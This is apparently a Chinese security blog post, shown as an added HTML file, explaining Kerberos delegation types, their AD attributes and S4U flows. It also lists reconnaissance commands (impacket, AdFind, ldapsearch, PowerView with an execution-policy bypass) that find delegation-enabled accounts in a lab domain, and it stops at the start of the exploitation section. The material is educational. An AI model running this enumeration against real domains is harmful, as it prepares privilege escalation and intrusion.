@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+
+
+<link rel="canonical" href="http://example.com/2025/06/13/Kerberos%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2025/06/13/Kerberos%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/","path":"2025/06/13/Kerberos委派攻击/","title":"Kerberos Attacks - 委派的原理与利用"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Kerberos Attacks - 委派的原理与利用 | Y0ng's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Y0ng's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A7%94%E6%B4%BE"><span class="nav-text">委派</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A7%94%E6%B4%BE%E7%9A%84%E9%85%8D%E7%BD%AE"><span class="nav-text">委派的配置</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="nav-text">非约束委派</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="nav-text">约束委派</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="nav-text">基于资源的约束委派</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B5%81%E7%A8%8B-%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="nav-text">流程-非约束委派</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B5%81%E7%A8%8B-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="nav-text">流程-约束委派</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B5%81%E7%A8%8B-%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="nav-text">流程-基于资源的约束委派</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E5%A7%94%E6%B4%BE%E5%85%B3%E7%B3%BB%E6%9F%A5%E8%AF%A2%E5%B7%A5%E5%85%B7"><span class="nav-text">域内委派关系查询工具</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="nav-text">攻击-非约束委派</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%9F%A5%E8%AF%A2"><span class="nav-text">非约束委派查询</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8"><span class="nav-text">攻击利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E7%8E%B0%E6%88%90%E7%A5%A8%E6%8D%AE"><span class="nav-text">利用现成票据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%BA%E5%88%B6%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81"><span class="nav-text">强制身份认证</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="nav-text">攻击-约束委派</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F"><span class="nav-text">环境模拟</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%9F%A5%E8%AF%A2"><span class="nav-text">约束委派查询</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8-1"><span class="nav-text">攻击利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%89%E5%A7%94%E6%B4%BE%E8%B4%A6%E5%8F%B7%E5%87%AD%E8%AF%81"><span class="nav-text">有委派账号凭证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E5%AF%BC%E5%87%BA%E5%A7%94%E6%B4%BE%E8%B4%A6%E5%8F%B7%E7%A5%A8%E6%8D%AE"><span class="nav-text">本地导出委派账号票据</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="nav-text">攻击-基于资源的约束性委派</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RBCD%E6%9F%A5%E8%AF%A2"><span class="nav-text">RBCD查询</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8-2"><span class="nav-text">攻击利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8"><span class="nav-text">常规利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7%E6%8F%90%E6%9D%83-Rotten-Tomato"><span class="nav-text">服务账户提权(Rotten Tomato)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RBCD%E5%90%8E%E9%97%A8"><span class="nav-text">RBCD后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-Relay-to-LDAP"><span class="nav-text">NTLM Relay to LDAP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SMB-CVE-2019-1040"><span class="nav-text">SMB(CVE-2019-1040)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HTTP"><span class="nav-text">HTTP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WebDAV"><span class="nav-text">WebDAV</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Kerberos-Relay-to-LDAP"><span class="nav-text">Kerberos Relay to LDAP</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/06/13/Kerberos%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Y0ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Kerberos Attacks - 委派的原理与利用 | Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Kerberos Attacks - 委派的原理与利用
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-06-13 00:00:00" itemprop="dateCreated datePublished" datetime="2025-06-13T00:00:00+08:00">2025-06-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250522013405141.png" alt="image-20250522013405141"></p>
+<a id="more"></a>
+
+<h1 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h1><p><strong>什么是委派：</strong></p>
+<p>Kerberos 委派是 Kerberos 身份验证协议中的一项功能，允许服务代表用户行事。例如，Web 服务器可以使用 Kerberos 委派来验证用户身份，然后使用该用户身份验证票证代表该用户身份访问后端数据库。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250119223054197.png" alt="image-20250119223054197"></p>
+<p><strong>委派分为：</strong></p>
+<ul>
+<li>非约束委派（Unconstrained Delegation）：允许被委派的服务账户以委派用户的身份访问任何服务，存在较大的安全风险</li>
+<li>约束委派（Constrained Delegation）：限制了委派的范围，服务账户只能访问特定的服务，减少了安全风险</li>
+<li>基于资源的约束委派（Resource Based Constrained Delegation 也称 <strong>RBCD</strong>）：进一步限制了委派权限，将委派的控制权交给拥有被访问资源的管理员，提高了安全性</li>
+</ul>
+<p><strong>域中能够委派的账号类型：</strong></p>
+<ul>
+<li>主机账号（机器账户）：活动目录中的Computers组内的计算机</li>
+<li>服务账户：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer、MYSQL等；域用户通过注册SPN也能成为服务账号。</li>
+</ul>
+<h1 id="委派的配置"><a href="#委派的配置" class="headerlink" title="委派的配置"></a>委派的配置</h1><h2 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h2><p>选择：<code>信任此计算机来委派任何服务 (仅 Kerberos)(T)</code></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250119234030581.png" alt="image-20250119234030581"></p>
+<p>配置了非约束性委派属性的计算机用户的 <strong>userAccountControl</strong> 属性为：<strong>WORKSTATION_TRUST_ACCOUNT | TRUSTED_FOR_DELEGATION</strong>，其对应的数是 0x81000=528384</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250119234246535.png" alt="image-20250119234246535"></p>
+<p><strong>msDS- AllowedToDelegateTo</strong> 属性为空</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250119234637164.png" alt="image-20250119234637164"></p>
+<h2 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h2><p>约束性委派有两种：</p>
+<ul>
+<li>仅使用 Kerberos(K)</li>
+<li>使用任何身份验证协议 (N)</li>
+</ul>
+<p>一、仅用 Kerberos 协议进行身份验证，不支持协议转换。配置了仅使用 Kerberos(K) 约束性委派的 <strong>机器账号 和 服务账号</strong> 的 <strong>userAccountControl</strong> 属性与正常账号一样，其 <strong>msDS- AllowedToDelegateTo</strong> 属性会有允许被委派的服务的 SPN。</p>
+<p>点击添加来添加服务，通过spn查找来查看当前域内的服务，这里就添加一个HOST/Win7.test.com作为实例</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250119235138953.png" alt="image-20250119235138953"></p>
+<p>随便添加一个服务</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250119235449695.png" alt="image-20250119235449695"></p>
+<p><strong>msDS- AllowedToDelegateTo</strong> 属性：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250119235543550.png" alt="image-20250119235543550"></p>
+<p>二、使用任何身份验证协议 (N)，支持协议的转换。其 <strong>msDS-AllowedToDelegateTo</strong> 属性会有允许被委派的服务的 SPN。</p>
+<p>配置了使用任何身份验证协议 (N) 约束性委派的 <strong>机器账号</strong> 的 <strong>userAccountControl</strong> 属性为： <code>WORKSTATION_TRUST_ACCOUNT | TRUETED_TO_AUTHENTICATE_FOR_DELEGATION</code>，其对应的数是0x1001000=16781312</p>
+<p>配置了使用任何身份验证协议 (N) 约束性委派的 <strong>服务账号</strong> 的 <strong>userAccountControl</strong> 属性为：<code>NORMAL_ACCOUNT | TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION</code>，其对应的数是0x1000200=16777728</p>
+<h2 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h2><p>通过 <strong>msDS-AllowedToActOnBehalfOfOtherIdentity</strong> 属性进行配置，只能在命令行进行配置</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#To set attribute:</span><br><span class="line">#设置属性</span><br><span class="line">Set-ADComputer -Identity MSSQL01$ -PrincipalsAllowedToDelegateToAccount WEB$ -Verbose</span><br><span class="line"></span><br><span class="line">#To get</span><br><span class="line">#查询属性</span><br><span class="line">$comp &#x3D; Get-ADComputer -Identity MSSQL01$ -Properties msDS-AllowedToActOnBehalfOfOtherIdentity</span><br><span class="line">$comp.&#39;msDS-AllowedToActOnBehalfOfOtherIdentity&#39;.Access</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="流程-非约束委派"><a href="#流程-非约束委派" class="headerlink" title="流程-非约束委派"></a>流程-非约束委派</h1><p> Windows Server 2000 首次发布Active Directory时引入，客户端会将其 TGT 的副本委派给某个服务，因此该服务可以使用该 TGT 在网络中代表客户端行事。</p>
+<p>以web服务器（HTTP）+文件服务器（FS）作为该实验场景，基本流程：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250126222546137.png" alt="image-20250126222546137"></p>
+<p>通信流量为：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250126222706358.png" alt="image-20250126222706358"></p>
+<ol>
+<li>客户端请求TGT（AS-REQ）</li>
+<li>KDC返回TGT（AS-REP）</li>
+<li>客户端请求HTTP服务器的ST（TGS-REQ）</li>
+<li>KDC返回ST，但是 <strong>ok-as-delegate 标志设置为 TRUE，通知客户端所请求的服务已获得授权委托</strong></li>
+<li>客户端再次发起新的TGS-REQ请求，用于请求获取 <strong>额外的用户TGT</strong>，且要求该TGT开启 <strong>forwardable 和 forwarded</strong>，即 <code>可转发TGT</code></li>
+<li>KDC返回 <code>可转发TGT</code></li>
+<li>客户端向HTTP服务器发起AP-REQ请求，该请求包含ST 和 <code>可转发TGT</code> 票证</li>
+<li>HTTP服务器将 <code>可转发TGT</code> <strong>缓存在内存中</strong>，并使用该TGT向KDC请求FS的ST</li>
+<li>KDC返回FS的ST</li>
+<li>HTTP收到FS的ST后，调用FS服务</li>
+<li>FS将结果返回给HTTP</li>
+<li>HTTP再将结果返回给客户端</li>
+</ol>
+<h1 id="流程-约束委派"><a href="#流程-约束委派" class="headerlink" title="流程-约束委派"></a>流程-约束委派</h1><p>由于非约束委派可以伪造访问任何服务的不安全性，微软在 windows server2003 中引入了约束委派，旨在提供一种可供服务使用的更安全的委派形式，<strong>将委派范围限制为仅明确允许的服务</strong>，在约束委派中，TGS 请求中不需要包含用户的 TGT。<strong>服务本身可以代表用户请求其他服务的服务票证，只要有证据表明它已收到用户的请求即可</strong></p>
+<p>对 Kerberos 协议进行了拓展，引入了 S4U。其中 S4U 支持两个子协议：</p>
+<ul>
+<li>Service for User to Proxy (S4U2proxy) ：允许服务账户以用户的身份请求其他服务的服务票据，并将其传递给目标服务，因此具有更广泛的委派权限。</li>
+<li>Service for User to Self (S4U2self) ：允许服务代表用户获取自身的服务票证，但无法代表用户请求其他服务</li>
+</ul>
+<p><strong>仅使用 Kerberos</strong></p>
+<p>当客户端使用 Kerberos 进行身份验证时，服务可以委托（使用 S4U2Proxy 扩展）</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250127003103141.png" alt="image-20250127003103141"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250127005111249.png" alt="image-20250127005111249"></p>
+<ol start="4">
+<li><p>Kerberos 认证</p>
+</li>
+<li><p>客户端向 Web 服务器发送 HTTP AP-REQ 消息，请求包括服务票证ST</p>
+</li>
+<li><p>HTTP服务可以使用 S4U2Proxy 请求额外的服务票证。将用户ST票证附加到TGS-REQ结构的 <strong>附加票证 字段中</strong>。</p>
+</li>
+<li><p>KDC 将检查附加票证，验证其是否可转发，并通过检查 <strong>msDS-AllowedToDelegateTo</strong> 属性进一步验证 HTTP服务 是否可以委托给 FS服务。通过TGS-REP将FS的ST返给HTTP服务</p>
+</li>
+<li><p>HTTP收到FS的ST后，调用FS服务</p>
+</li>
+<li><p>FS将结果返回给HTTP</p>
+</li>
+<li><p>HTTP再将结果返回给客户端</p>
+</li>
+</ol>
+<p><strong>使用任何身份验证协议</strong></p>
+<p>无论客户端如何进行身份验证，服务都可以委托（使用 S4U2Self 和 S4U2Proxy 扩展）</p>
+<p>例如通过 NTLM 身份验证，服务就没有附加票证，此时需要另一种方式来获取客户端代表其委派的票证，服务可以调用 S4U2Self 来要求身份验证服务为其自身生成任意用户的 TGS，随后再调用 S4U2Proxy。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250127003134415.png" alt="image-20250127003134415"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250127005949624.png" alt="image-20250127005949624"></p>
+<ol>
+<li>客户端向 Web 服务器发送 HTTP 请求。由于应用程序不接受 Kerberos，因此将使用 NTLM 执行身份验证</li>
+<li>由于目前没有客户的TGS，无法去获取FS的TGS，所以先使用S4U2Self来请求客户的TGS，存在特定于 S4U2Self 扩展的结构 <strong>pA-FOR-X509-USER</strong>和 <strong>pA-FOR-USER</strong>，其名称为要模拟的客户端</li>
+<li>KDC 将验证 DEV 是否配置了启用约束委派，返回代表自身的 <code>可转发TGS</code></li>
+<li>发起S4U2Proxy 请求FS服务的ST</li>
+<li>返回FS服务的ST</li>
+<li>调用FS服务</li>
+<li>FS将结果返回给HTTP</li>
+<li>HTTP再将结果返回给客户端</li>
+</ol>
+<h1 id="流程-基于资源的约束委派"><a href="#流程-基于资源的约束委派" class="headerlink" title="流程-基于资源的约束委派"></a>流程-基于资源的约束委派</h1><p>为了配置受约束的委派，必须拥有SeEnableDelegation特权，该特权很敏感，通常仅授予域管理员。为了使用户/资源更加独立，Windows Server 2012中引入了基于资源的约束委派（RBCD）。</p>
+<p>RBCD允许资源配置受信任的帐户委派给他们：仅允许ServiceA能委派访问我的服务</p>
+<p>RBCD将委派的控制权交给拥有被访问资源的管理员：ServiceB的管理员可以配置RBCD，不需要域管了</p>
+<p>RBCD是通过 <strong>msDS-AllowedToActOnBehalfOfOtherIdentity</strong> 属性类进行配置</p>
+<p>见下图对比，约束委派是 <strong>出去能访问到谁</strong>，RBCD是 <strong>谁能够访问到我</strong></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250127012741931.png" alt="image-20250127012741931"></p>
+<p>其通信流程与约束委派相同</p>
+<h1 id="域内委派关系查询工具"><a href="#域内委派关系查询工具" class="headerlink" title="域内委派关系查询工具"></a>域内委派关系查询工具</h1><p>除了 <a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">powerview</a>、ADFind、ldapsearch 外还有几种通用查询工具</p>
+<p>impacket</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impacket-findDelegation -dc-ip 192.168.100.128 test.com&#x2F;tom:Ab123456</span><br></pre></td></tr></table></figure>
+
+<p>Adinfo</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;Adinfo -d test.com --dc 192.168.131.130 -u fff -H 5e956...</span><br><span class="line">.&#x2F;Adinfo -d test.com --dc 192.168.131.130 -u fff -p Qq123456..</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="攻击-非约束委派"><a href="#攻击-非约束委派" class="headerlink" title="攻击-非约束委派"></a>攻击-非约束委派</h1><p>根据其流程，<strong>假设serverA的机器账户开启了非约束委派</strong>，用户user与KDC进行正常的kerberos认证中，KDC发现serverA开启了非约束委派会在TGS-REP中添加标志位 <strong>ok-as-delegate</strong> ，随后用户user再次发起TGS-REQ用于请求获取可代表用户身份的 <strong>可转发TGT</strong>，KDC返回，然后在AP-REQ中将 <strong>ST和可转发TGT</strong> 二者一起发送给serverA，随后serverA将代表用户身份的 <strong>可转发TGT储存在自己的lsass进程中</strong>，后续就能利用这个TGT去代表用户user去访问任何服务。</p>
+<blockquote>
+<p>只要想办法让目标机器对非约束委派机器发起认证，就能获取TGT代表用户去访问任何服务</p>
+</blockquote>
+<h2 id="非约束委派查询"><a href="#非约束委派查询" class="headerlink" title="非约束委派查询"></a>非约束委派查询</h2><p>在域内探测侦察查询非约束委派的账号有几种方法：</p>
+<p>powerview：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-ExecutionPolicy Bypass -Scope Process -Force</span><br><span class="line">import-module .\powerview.ps1</span><br><span class="line"></span><br><span class="line"># 查询 非约束性委派的计算机&#x2F;计算机账户</span><br><span class="line">Get-NetComputer -Unconstrained -Domain zjun.com</span><br><span class="line"></span><br><span class="line"># 查询 非约束性委派的服务账号</span><br><span class="line">Get-NetUser -Unconstrained -Domain zjun.com | select name</span><br></pre></td></tr></table></figure>
+
+<p>ADFind：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查询 非约束性委派的计算机&#x2F;计算机账户</span><br><span class="line">AdFind.exe -b &quot;DC&#x3D;test,DC&#x3D;com&quot; -f &quot;(&amp;(samAccountType&#x3D;805306369)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; -dn</span><br><span class="line"></span><br><span class="line"># 查询 非约束性委派的服务账号</span><br><span class="line">AdFind.exe -b &quot;DC&#x3D;test,DC&#x3D;com&quot; -f &quot;(&amp;(samAccountType&#x3D;805306368)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; -dn</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250515015212828.png" alt="image-20250515015212828"></p>
+<p>ldapsearch：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install ldap-utils</span><br><span class="line"></span><br><span class="line"># 查询 非约束性委派的计算机&#x2F;计算机账户</span><br><span class="line">ldapsearch -LLL -x -H ldap:&#x2F;&#x2F;172.16.86.136:389 -D &quot;test@zjun.com&quot; -w &quot;P@ssw0rd&quot; -b &quot;dc&#x3D;zjun,dc&#x3D;com&quot; &quot;(&amp;(samAccountType&#x3D;805306369)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; -dn</span><br><span class="line"></span><br><span class="line"># 查询 非约束性委派的服务账号</span><br><span class="line">ldapsearch -LLL -x -H ldap:&#x2F;&#x2F;172.16.86.136:389 -D &quot;test@zjun.com&quot; -w &quot;P@ssw0rd&quot; -b &quot;dc&#x3D;zjun,dc&#x3D;com&quot; &quot;(&amp;(samAccountType&#x3D;805306368)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>
+
+<h2 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h2><p>如果目前拿下了serverA机器中的某些非约束委派账号权限，两种攻击利用思路：</p>
+<ol>
+<li>查看当前内存中有哪些票据，利用票据</li>
+<li>诱导或强迫目标机器（可以是域控）和该机器进行认证，从而导出内存中的目标机器TGT</li>
+</ol>
